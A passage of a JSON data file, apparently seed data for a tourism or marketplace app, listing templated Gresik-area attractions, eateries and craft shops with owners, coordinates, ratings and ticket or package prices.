                "image": "https://images.unsplash.com/photo-1501785888041-af3ef285b470?auto=format&fit=crop&w=600&q=80",
                "description": "Wahana bermain dan rekreasi keluarga terpadu berupa taman bunga indah yang berada di kawasan strategis Kecamatan Benjeng, Gresik.",
                "coords": [
                    -7.171362,
                    112.650945
                ],
                "rating": 4.5,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c158_1",
                        "name": "Tiket / Menu Layanan Taman Bunga Indah",
                        "price": 20000,
                        "description": "Akses menikmati layanan berkualitas premium di Taman Bunga Indah Manyar Gresik."
                    },
                    {
                        "id": "c158_2",
                        "name": "Paket Premium Taman Bunga Indah",
                        "price": 50000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m159",
                "name": "Kerajinan Lampion Damar Kurung Balongpanggang",
                "owner": "Cak Sidayu",
                "type": "budaya",
                "image": "https://images.unsplash.com/photo-1516450360452-9312f5e86fc7?auto=format&fit=crop&w=600&q=80",
                "description": "Pusat pelestarian warisan budaya kesenian leluhur berupa kerajinan lampion damar kurung yang berada di kawasan strategis Kecamatan Balongpanggang, Gresik.",
                "coords": [
                    -7.141977,
                    112.678286
                ],
                "rating": 4.8,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c159_1",
                        "name": "Tiket / Menu Layanan Kerajinan Lampion Damar Kurung",
                        "price": 15000,
                        "description": "Akses menikmati layanan berkualitas premium di Kerajinan Lampion Damar Kurung Manyar Gresik."
                    },
                    {
                        "id": "c159_2",
                        "name": "Paket Premium Kerajinan Lampion Damar Kurung",
                        "price": 25000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m160",
                "name": "Kebun Nanas Madu Duduksampeyan",
                "owner": "Cak Bawean",
                "type": "edukasi",
                "image": "https://images.unsplash.com/photo-1448375240586-882707db888b?auto=format&fit=crop&w=600&q=80",
                "description": "Pusat riset dan pembelajaran edukatif lapangan berupa kebun nanas madu yang berada di kawasan strategis Kecamatan Duduksampeyan, Gresik.",
                "coords": [
                    -7.427108,
                    112.605753
                ],
                "rating": 4.7,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c160_1",
                        "name": "Tiket / Menu Layanan Kebun Nanas Madu",
                        "price": 10000,
                        "description": "Akses menikmati layanan berkualitas premium di Kebun Nanas Madu Manyar Gresik."
                    },
                    {
                        "id": "c160_2",
                        "name": "Paket Premium Kebun Nanas Madu",
                        "price": 50000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m161",
                "name": "Sego Ruwet Wringinanom",
                "owner": "Cak Ahmad",
                "type": "kuliner",
                "image": "https://images.unsplash.com/photo-1565557623262-b51c2513a641?auto=format&fit=crop&w=600&q=80",
                "description": "Warung makan tradisional khas menyajikan menu sego ruwet yang berada di kawasan strategis Kecamatan Wringinanom, Gresik.",
                "coords": [
                    -7.182431,
                    112.683392
                ],
                "rating": 4.8,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c161_1",
                        "name": "Tiket / Menu Layanan Sego Ruwet",
                        "price": 20000,
                        "description": "Akses menikmati layanan berkualitas premium di Sego Ruwet Manyar Gresik."
                    },
                    {
                        "id": "c161_2",
                        "name": "Paket Premium Sego Ruwet",
                        "price": 25000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m162",
                "name": "Bukit Kapur Driyorejo",
                "owner": "Cak Budi",
                "type": "alam",
                "image": "https://images.unsplash.com/photo-1507525428034-b723cf961d3e?auto=format&fit=crop&w=600&q=80",
                "description": "Keindahan panorama alam tersembunyi berupa bukit kapur yang berada di kawasan strategis Kecamatan Driyorejo, Gresik.",
                "coords": [
                    -7.141054,
                    112.713397
                ],
                "rating": 4.8,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c162_1",
                        "name": "Tiket / Menu Layanan Bukit Kapur",
                        "price": 15000,
                        "description": "Akses menikmati layanan berkualitas premium di Bukit Kapur Manyar Gresik."
                    },
                    {
                        "id": "c162_2",
                        "name": "Paket Premium Bukit Kapur",
                        "price": 55000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m163",
                "name": "Makam Bupati Kedamean",
                "owner": "Cak Lia",
                "type": "religi",
                "image": "https://images.unsplash.com/photo-1584551246679-0daf3d275d0f?auto=format&fit=crop&w=600&q=80",
                "description": "Situs sakral tempat beribadah dan ziarah agung makam bupati yang berada di kawasan strategis Kecamatan Kedamean, Gresik.",
                "coords": [
                    -7.374983,
                    112.687647
                ],
                "rating": 4.4,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c163_1",
                        "name": "Tiket / Menu Layanan Makam Bupati",
                        "price": 10000,
                        "description": "Akses menikmati layanan berkualitas premium di Makam Bupati Manyar Gresik."
                    },
                    {
                        "id": "c163_2",
                        "name": "Paket Premium Makam Bupati",
                        "price": 25000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m164",
                "name": "Makam Kuno Adipati Menganti",
                "owner": "Cak Roni",
                "type": "sejarah",
                "image": "https://images.unsplash.com/photo-1486406146926-c627a92ad1ab?auto=format&fit=crop&w=600&q=80",
                "description": "Bangunan bersejarah peninggalan purbakala berupa makam kuno adipati yang berada di kawasan strategis Kecamatan Menganti, Gresik.",
                "coords": [
                    -7.137821,
                    112.59654
                ],
                "rating": 4.9,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c164_1",
                        "name": "Tiket / Menu Layanan Makam Kuno Adipati",
                        "price": 10000,
                        "description": "Akses menikmati layanan berkualitas premium di Makam Kuno Adipati Manyar Gresik."
                    },
                    {
                        "id": "c164_2",
                        "name": "Paket Premium Makam Kuno Adipati",
                        "price": 35000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m165",
                "name": "Batik Goyor ATBM Sidayu",
                "owner": "Cak Santi",
                "type": "belanja",
                "image": "https://images.unsplash.com/photo-1505253716362-afaea1d3d1af?auto=format&fit=crop&w=600&q=80",
                "description": "Sentra perdagangan belanja produk unggulan lokal berupa batik goyor atbm yang berada di kawasan strategis Kecamatan Sidayu, Gresik.",
                "coords": [
                    -7.239534,
                    112.646414
                ],
                "rating": 4.7,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c165_1",
                        "name": "Tiket / Menu Layanan Batik Goyor ATBM",
                        "price": 15000,
                        "description": "Akses menikmati layanan berkualitas premium di Batik Goyor ATBM Manyar Gresik."
                    },
                    {
                        "id": "c165_2",
                        "name": "Paket Premium Batik Goyor ATBM",
                        "price": 40000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m166",
                "name": "Taman Kota Bertingkat Ujungpangkah",
                "owner": "Cak Mega",
                "type": "rekreasi",
                "image": "https://images.unsplash.com/photo-1544735716-392fe2489ffa?auto=format&fit=crop&w=600&q=80",
                "description": "Wahana bermain dan rekreasi keluarga terpadu berupa taman kota bertingkat yang berada di kawasan strategis Kecamatan Ujungpangkah, Gresik.",
                "coords": [
                    -7.276286,
                    112.654113
                ],
                "rating": 4.6,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c166_1",
                        "name": "Tiket / Menu Layanan Taman Kota Bertingkat",
                        "price": 10000,
                        "description": "Akses menikmati layanan berkualitas premium di Taman Kota Bertingkat Manyar Gresik."
                    },
                    {
                        "id": "c166_2",
                        "name": "Paket Premium Taman Kota Bertingkat",
                        "price": 55000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m167",
                "name": "Teater Rakyat Gresik Panceng",
                "owner": "Cak Cak",
                "type": "budaya",
                "image": "https://images.unsplash.com/photo-1534447677768-be436bb09401?auto=format&fit=crop&w=600&q=80",
                "description": "Pusat pelestarian warisan budaya kesenian leluhur berupa teater rakyat gresik yang berada di kawasan strategis Kecamatan Panceng, Gresik.",
                "coords": [
                    -7.13827,
                    112.571129
                ],
                "rating": 4.2,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c167_1",
                        "name": "Tiket / Menu Layanan Teater Rakyat Gresik",
                        "price": 10000,
                        "description": "Akses menikmati layanan berkualitas premium di Teater Rakyat Gresik Manyar Gresik."
                    },
                    {
                        "id": "c167_2",
                        "name": "Paket Premium Teater Rakyat Gresik",
                        "price": 35000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m168",
                "name": "Pusat Karang Bawean Bungah",
                "owner": "Cak Mak",
                "type": "edukasi",
                "image": "https://images.unsplash.com/photo-1497633762265-9d179a990aa6?auto=format&fit=crop&w=600&q=80",
                "description": "Pusat riset dan pembelajaran edukatif lapangan berupa pusat karang bawean yang berada di kawasan strategis Kecamatan Bungah, Gresik.",
                "coords": [
                    -7.243207,
                    112.583064
                ],
                "rating": 4.3,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c168_1",
                        "name": "Tiket / Menu Layanan Pusat Karang Bawean",
                        "price": 5000,
                        "description": "Akses menikmati layanan berkualitas premium di Pusat Karang Bawean Manyar Gresik."
                    },
                    {
                        "id": "c168_2",
                        "name": "Paket Premium Pusat Karang Bawean",
                        "price": 45000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m169",
                "name": "Es Dawet Siwalan Tambak Bawean",
                "owner": "Cak Haji",
                "type": "kuliner",
                "image": "https://images.unsplash.com/photo-1565557623262-b51c2513a641?auto=format&fit=crop&w=600&q=80",
                "description": "Warung makan tradisional khas menyajikan menu es dawet siwalan yang berada di kawasan strategis Kecamatan Tambak Bawean, Gresik.",
                "coords": [
                    -7.301521,
                    112.697741
                ],
                "rating": 4.9,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c169_1",
                        "name": "Tiket / Menu Layanan Es Dawet Siwalan",
                        "price": 5000,
                        "description": "Akses menikmati layanan berkualitas premium di Es Dawet Siwalan Manyar Gresik."
                    },
                    {
                        "id": "c169_2",
                        "name": "Paket Premium Es Dawet Siwalan",
                        "price": 35000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m170",
                "name": "Puncak Awan Sangkapura Bawean",
                "owner": "Cak Neng",
                "type": "alam",
                "image": "https://images.unsplash.com/photo-1501785888041-af3ef285b470?auto=format&fit=crop&w=600&q=80",
                "description": "Keindahan panorama alam tersembunyi berupa puncak awan yang berada di kawasan strategis Kecamatan Sangkapura Bawean, Gresik.",
                "coords": [
                    -7.165088,
                    112.628001
                ],
                "rating": 4.4,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c170_1",
                        "name": "Tiket / Menu Layanan Puncak Awan",
                        "price": 20000,
                        "description": "Akses menikmati layanan berkualitas premium di Puncak Awan Manyar Gresik."
                    },
                    {
                        "id": "c170_2",
                        "name": "Paket Premium Puncak Awan",
                        "price": 55000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m171",
                "name": "Makam Syekh Kebomas",
                "owner": "Cak Warkop",
                "type": "religi",
                "image": "https://images.unsplash.com/photo-1584551246679-0daf3d275d0f?auto=format&fit=crop&w=600&q=80",
                "description": "Situs sakral tempat beribadah dan ziarah agung makam syekh yang berada di kawasan strategis Kecamatan Kebomas, Gresik.",
                "coords": [
                    -7.11184,
                    112.741307
                ],
                "rating": 4.8,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c171_1",
                        "name": "Tiket / Menu Layanan Makam Syekh",
                        "price": 30000,
                        "description": "Akses menikmati layanan berkualitas premium di Makam Syekh Manyar Gresik."
                    },
                    {
                        "id": "c171_2",
                        "name": "Paket Premium Makam Syekh",
                        "price": 35000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m172",
                "name": "Benteng Pertahanan Manyar",
                "owner": "Cak Sejarah",
                "type": "sejarah",
                "image": "https://images.unsplash.com/photo-1486406146926-c627a92ad1ab?auto=format&fit=crop&w=600&q=80",
                "description": "Bangunan bersejarah peninggalan purbakala berupa benteng pertahanan yang berada di kawasan strategis Kecamatan Manyar, Gresik.",
                "coords": [
                    -7.348719,
                    112.75299
                ],
                "rating": 4.8,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c172_1",
                        "name": "Tiket / Menu Layanan Benteng Pertahanan",
                        "price": 25000,
                        "description": "Akses menikmati layanan berkualitas premium di Benteng Pertahanan Manyar Gresik."
                    },
                    {
                        "id": "c172_2",
                        "name": "Paket Premium Benteng Pertahanan",
                        "price": 40000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m173",
                "name": "Pengrajin Rebana Hadrah Gresik Kota",
                "owner": "Cak Keluarga",
                "type": "belanja",
                "image": "https://images.unsplash.com/photo-1505253716362-afaea1d3d1af?auto=format&fit=crop&w=600&q=80",
                "description": "Sentra perdagangan belanja produk unggulan lokal berupa pengrajin rebana hadrah yang berada di kawasan strategis Kecamatan Gresik Kota, Gresik.",
                "coords": [
                    -7.065343,
                    112.666182
                ],
                "rating": 4.9,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c173_1",
                        "name": "Tiket / Menu Layanan Pengrajin Rebana Hadrah",
                        "price": 20000,
                        "description": "Akses menikmati layanan berkualitas premium di Pengrajin Rebana Hadrah Manyar Gresik."
                    },
                    {
                        "id": "c173_2",
                        "name": "Paket Premium Pengrajin Rebana Hadrah",
                        "price": 25000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m174",
                "name": "Taman Pasir Bermain Cerme",
                "owner": "Cak Backpacker",
                "type": "rekreasi",
                "image": "https://images.unsplash.com/photo-1534438327276-14e5300c3a48?auto=format&fit=crop&w=600&q=80",
                "description": "Wahana bermain dan rekreasi keluarga terpadu berupa taman pasir bermain yang berada di kawasan strategis Kecamatan Cerme, Gresik.",
                "coords": [
                    -7.063324,
                    112.659311
                ],
                "rating": 4.4,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c174_1",
                        "name": "Tiket / Menu Layanan Taman Pasir Bermain",
                        "price": 15000,
                        "description": "Akses menikmati layanan berkualitas premium di Taman Pasir Bermain Manyar Gresik."
                    },
                    {
                        "id": "c174_2",
                        "name": "Paket Premium Taman Pasir Bermain",
                        "price": 55000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m175",
                "name": "Sanggar Tari Kembang Benjeng",
                "owner": "Cak Kulineran",
                "type": "budaya",
                "image": "https://images.unsplash.com/photo-1589301760014-d929f3979dbc?auto=format&fit=crop&w=600&q=80",
                "description": "Pusat pelestarian warisan budaya kesenian leluhur berupa sanggar tari kembang yang berada di kawasan strategis Kecamatan Benjeng, Gresik.",
                "coords": [
                    -7.438033,
                    112.693886
                ],
                "rating": 4.6,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c175_1",
                        "name": "Tiket / Menu Layanan Sanggar Tari Kembang",
                        "price": 30000,
                        "description": "Akses menikmati layanan berkualitas premium di Sanggar Tari Kembang Manyar Gresik."
                    },
                    {
                        "id": "c175_2",
                        "name": "Paket Premium Sanggar Tari Kembang",
                        "price": 50000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m176",
                "name": "Pusat Lepas Tukik Balongpanggang",
                "owner": "Cak Gresik",
                "type": "edukasi",
                "image": "https://images.unsplash.com/photo-1503676260728-1c00da094a0b?auto=format&fit=crop&w=600&q=80",
                "description": "Pusat riset dan pembelajaran edukatif lapangan berupa pusat lepas tukik yang berada di kawasan strategis Kecamatan Balongpanggang, Gresik.",
                "coords": [
                    -7.191595,
                    112.71939
                ],
                "rating": 4.4,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c176_1",
                        "name": "Tiket / Menu Layanan Pusat Lepas Tukik",
                        "price": 5000,
                        "description": "Akses menikmati layanan berkualitas premium di Pusat Lepas Tukik Manyar Gresik."
                    },
                    {
                        "id": "c176_2",
                        "name": "Paket Premium Pusat Lepas Tukik",
                        "price": 35000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m177",
                "name": "Sego Ruwet Duduksampeyan",
                "owner": "Cak AlunAlun",
                "type": "kuliner",
                "image": "https://images.unsplash.com/photo-1565557623262-b51c2513a641?auto=format&fit=crop&w=600&q=80",
                "description": "Warung makan tradisional khas menyajikan menu sego ruwet yang berada di kawasan strategis Kecamatan Duduksampeyan, Gresik.",
                "coords": [
                    -7.069355,
                    112.581006
                ],
                "rating": 4.7,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c177_1",
                        "name": "Tiket / Menu Layanan Sego Ruwet",
                        "price": 5000,
                        "description": "Akses menikmati layanan berkualitas premium di Sego Ruwet Manyar Gresik."
                    },
                    {
                        "id": "c177_2",
                        "name": "Paket Premium Sego Ruwet",
                        "price": 45000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m178",
                "name": "Bukit Kapur Wringinanom",
                "owner": "Cak Ziarah",
                "type": "alam",
                "image": "https://images.unsplash.com/photo-1470071459604-3b5ec3a7fe05?auto=format&fit=crop&w=600&q=80",
                "description": "Keindahan panorama alam tersembunyi berupa bukit kapur yang berada di kawasan strategis Kecamatan Wringinanom, Gresik.",
                "coords": [
                    -7.392255,
                    112.666558
                ],
                "rating": 4.4,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c178_1",
                        "name": "Tiket / Menu Layanan Bukit Kapur",
                        "price": 30000,
                        "description": "Akses menikmati layanan berkualitas premium di Bukit Kapur Manyar Gresik."
                    },
                    {
                        "id": "c178_2",
                        "name": "Paket Premium Bukit Kapur",
                        "price": 30000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m179",
                "name": "Sentra Zikir Driyorejo",
                "owner": "Cak Sidayu",
                "type": "religi",
                "image": "https://images.unsplash.com/photo-1584551246679-0daf3d275d0f?auto=format&fit=crop&w=600&q=80",
                "description": "Situs sakral tempat beribadah dan ziarah agung sentra zikir yang berada di kawasan strategis Kecamatan Driyorejo, Gresik.",
                "coords": [
                    -7.180132,
                    112.577858
                ],
                "rating": 4.6,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c179_1",
                        "name": "Tiket / Menu Layanan Sentra Zikir",
                        "price": 25000,
                        "description": "Akses menikmati layanan berkualitas premium di Sentra Zikir Manyar Gresik."
                    },
                    {
                        "id": "c179_2",
                        "name": "Paket Premium Sentra Zikir",
                        "price": 45000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m180",
                "name": "Monumen Perjuangan Kedamean",
                "owner": "Cak Bawean",
                "type": "sejarah",
                "image": "https://images.unsplash.com/photo-1486406146926-c627a92ad1ab?auto=format&fit=crop&w=600&q=80",
                "description": "Bangunan bersejarah peninggalan purbakala berupa monumen perjuangan yang berada di kawasan strategis Kecamatan Kedamean, Gresik.",
                "coords": [
                    -7.087912,
                    112.727655
                ],
                "rating": 4.4,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c180_1",
                        "name": "Tiket / Menu Layanan Monumen Perjuangan",
                        "price": 15000,
                        "description": "Akses menikmati layanan berkualitas premium di Monumen Perjuangan Manyar Gresik."
                    },
                    {
                        "id": "c180_2",
                        "name": "Paket Premium Monumen Perjuangan",
                        "price": 35000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m181",
                "name": "Sentra Tenun Sarung Menganti",
                "owner": "Cak Ahmad",
                "type": "belanja",
                "image": "https://images.unsplash.com/photo-1505253716362-afaea1d3d1af?auto=format&fit=crop&w=600&q=80",
                "description": "Sentra perdagangan belanja produk unggulan lokal berupa sentra tenun sarung yang berada di kawasan strategis Kecamatan Menganti, Gresik.",
                "coords": [
                    -7.311065,
                    112.722894
                ],
                "rating": 4.7,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c181_1",
                        "name": "Tiket / Menu Layanan Sentra Tenun Sarung",
                        "price": 15000,
                        "description": "Akses menikmati layanan berkualitas premium di Sentra Tenun Sarung Manyar Gresik."
                    },
                    {
                        "id": "c181_2",
                        "name": "Paket Premium Sentra Tenun Sarung",
                        "price": 60000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m182",
                "name": "Taman Bunga Indah Sidayu",
                "owner": "Cak Budi",
                "type": "rekreasi",
                "image": "https://images.unsplash.com/photo-1501785888041-af3ef285b470?auto=format&fit=crop&w=600&q=80",
                "description": "Wahana bermain dan rekreasi keluarga terpadu berupa taman bunga indah yang berada di kawasan strategis Kecamatan Sidayu, Gresik.",
                "coords": [
                    -7.122621,
                    112.649441
                ],
                "rating": 4.2,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c182_1",
                        "name": "Tiket / Menu Layanan Taman Bunga Indah",
                        "price": 25000,
                        "description": "Akses menikmati layanan berkualitas premium di Taman Bunga Indah Manyar Gresik."
                    },
                    {
                        "id": "c182_2",
                        "name": "Paket Premium Taman Bunga Indah",
                        "price": 25000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m183",
                "name": "Kerajinan Lampion Damar Kurung Ujungpangkah",
                "owner": "Cak Lia",
                "type": "budaya",
                "image": "https://images.unsplash.com/photo-1516450360452-9312f5e86fc7?auto=format&fit=crop&w=600&q=80",
                "description": "Pusat pelestarian warisan budaya kesenian leluhur berupa kerajinan lampion damar kurung yang berada di kawasan strategis Kecamatan Ujungpangkah, Gresik.",
                "coords": [
                    -7.068286,
                    112.665274
                ],
                "rating": 4.2,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c183_1",
                        "name": "Tiket / Menu Layanan Kerajinan Lampion Damar Kurung",
                        "price": 30000,
                        "description": "Akses menikmati layanan berkualitas premium di Kerajinan Lampion Damar Kurung Manyar Gresik."
                    },
                    {
                        "id": "c183_2",
                        "name": "Paket Premium Kerajinan Lampion Damar Kurung",
                        "price": 55000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m184",
                "name": "Kebun Nanas Madu Panceng",
                "owner": "Cak Roni",
                "type": "edukasi",
                "image": "https://images.unsplash.com/photo-1448375240586-882707db888b?auto=format&fit=crop&w=600&q=80",
                "description": "Pusat riset dan pembelajaran edukatif lapangan berupa kebun nanas madu yang berada di kawasan strategis Kecamatan Panceng, Gresik.",
                "coords": [
                    -7.362374,
                    112.725923
                ],
                "rating": 4.7,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c184_1",
                        "name": "Tiket / Menu Layanan Kebun Nanas Madu",
                        "price": 5000,
                        "description": "Akses menikmati layanan berkualitas premium di Kebun Nanas Madu Manyar Gresik."
                    },
                    {
                        "id": "c184_2",
                        "name": "Paket Premium Kebun Nanas Madu",
                        "price": 45000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m185",
                "name": "Es Dawet Siwalan Bungah",
                "owner": "Cak Santi",
                "type": "kuliner",
                "image": "https://images.unsplash.com/photo-1565557623262-b51c2513a641?auto=format&fit=crop&w=600&q=80",
                "description": "Warung makan tradisional khas menyajikan menu es dawet siwalan yang berada di kawasan strategis Kecamatan Bungah, Gresik.",
                "coords": [
                    -7.100935,
                    112.742384
                ],
                "rating": 5,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c185_1",
                        "name": "Tiket / Menu Layanan Es Dawet Siwalan",
                        "price": 10000,
                        "description": "Akses menikmati layanan berkualitas premium di Es Dawet Siwalan Manyar Gresik."
                    },
                    {
                        "id": "c185_2",
                        "name": "Paket Premium Es Dawet Siwalan",
                        "price": 50000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m186",
                "name": "Puncak Awan Tambak Bawean",
                "owner": "Cak Mega",
                "type": "alam",
                "image": "https://images.unsplash.com/photo-1464822759023-fed622ff2c3b?auto=format&fit=crop&w=600&q=80",
                "description": "Keindahan panorama alam tersembunyi berupa puncak awan yang berada di kawasan strategis Kecamatan Tambak Bawean, Gresik.",
                "coords": [
                    -7.204236,
                    112.715861
                ],
                "rating": 4.7,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c186_1",
                        "name": "Tiket / Menu Layanan Puncak Awan",
                        "price": 25000,
                        "description": "Akses menikmati layanan berkualitas premium di Puncak Awan Manyar Gresik."
                    },
                    {
                        "id": "c186_2",
                        "name": "Paket Premium Puncak Awan",
                        "price": 25000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m187",
                "name": "Makam Bupati Sangkapura Bawean",
                "owner": "Cak Cak",
                "type": "religi",
                "image": "https://images.unsplash.com/photo-1584551246679-0daf3d275d0f?auto=format&fit=crop&w=600&q=80",
                "description": "Situs sakral tempat beribadah dan ziarah agung makam bupati yang berada di kawasan strategis Kecamatan Sangkapura Bawean, Gresik.",
                "coords": [
                    -7.347354,
                    112.714772
                ],
                "rating": 4.4,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c187_1",
                        "name": "Tiket / Menu Layanan Makam Bupati",
                        "price": 5000,
                        "description": "Akses menikmati layanan berkualitas premium di Makam Bupati Manyar Gresik."
                    },
                    {
                        "id": "c187_2",
                        "name": "Paket Premium Makam Bupati",
                        "price": 30000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m188",
                "name": "Makam Kuno Adipati Kebomas",
                "owner": "Cak Mak",
                "type": "sejarah",
                "image": "https://images.unsplash.com/photo-1486406146926-c627a92ad1ab?auto=format&fit=crop&w=600&q=80",
                "description": "Bangunan bersejarah peninggalan purbakala berupa makam kuno adipati yang berada di kawasan strategis Kecamatan Kebomas, Gresik.",
                "coords": [
                    -7.136215,
                    112.721404
                ],
                "rating": 4.8,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c188_1",
                        "name": "Tiket / Menu Layanan Makam Kuno Adipati",
                        "price": 10000,
                        "description": "Akses menikmati layanan berkualitas premium di Makam Kuno Adipati Manyar Gresik."
                    },
                    {
                        "id": "c188_2",
                        "name": "Paket Premium Makam Kuno Adipati",
                        "price": 25000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m189",
                "name": "Batik Goyor ATBM Manyar",
                "owner": "Cak Haji",
                "type": "belanja",
                "image": "https://images.unsplash.com/photo-1505253716362-afaea1d3d1af?auto=format&fit=crop&w=600&q=80",
                "description": "Sentra perdagangan belanja produk unggulan lokal berupa batik goyor atbm yang berada di kawasan strategis Kecamatan Manyar, Gresik.",
                "coords": [
                    -7.136895,
                    112.735127
                ],
                "rating": 4.4,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c189_1",
                        "name": "Tiket / Menu Layanan Batik Goyor ATBM",
                        "price": 5000,
                        "description": "Akses menikmati layanan berkualitas premium di Batik Goyor ATBM Manyar Gresik."
                    },
                    {
                        "id": "c189_2",
                        "name": "Paket Premium Batik Goyor ATBM",
                        "price": 30000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m190",
                "name": "Taman Kota Bertingkat Gresik Kota",
                "owner": "Cak Neng",
                "type": "rekreasi",
                "image": "https://images.unsplash.com/photo-1544735716-392fe2489ffa?auto=format&fit=crop&w=600&q=80",
                "description": "Wahana bermain dan rekreasi keluarga terpadu berupa taman kota bertingkat yang berada di kawasan strategis Kecamatan Gresik Kota, Gresik.",
                "coords": [
                    -7.285323,
                    112.557537
                ],
                "rating": 4.7,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c190_1",
                        "name": "Tiket / Menu Layanan Taman Kota Bertingkat",
                        "price": 30000,
                        "description": "Akses menikmati layanan berkualitas premium di Taman Kota Bertingkat Manyar Gresik."
                    },
                    {
                        "id": "c190_2",
                        "name": "Paket Premium Taman Kota Bertingkat",
                        "price": 35000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m191",
                "name": "Teater Rakyat Gresik Cerme",
                "owner": "Cak Warkop",
                "type": "budaya",
                "image": "https://images.unsplash.com/photo-1534447677768-be436bb09401?auto=format&fit=crop&w=600&q=80",
                "description": "Pusat pelestarian warisan budaya kesenian leluhur berupa teater rakyat gresik yang berada di kawasan strategis Kecamatan Cerme, Gresik.",
                "coords": [
                    -7.189307,
                    112.63589
                ],
                "rating": 4.8,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c191_1",
                        "name": "Tiket / Menu Layanan Teater Rakyat Gresik",
                        "price": 20000,
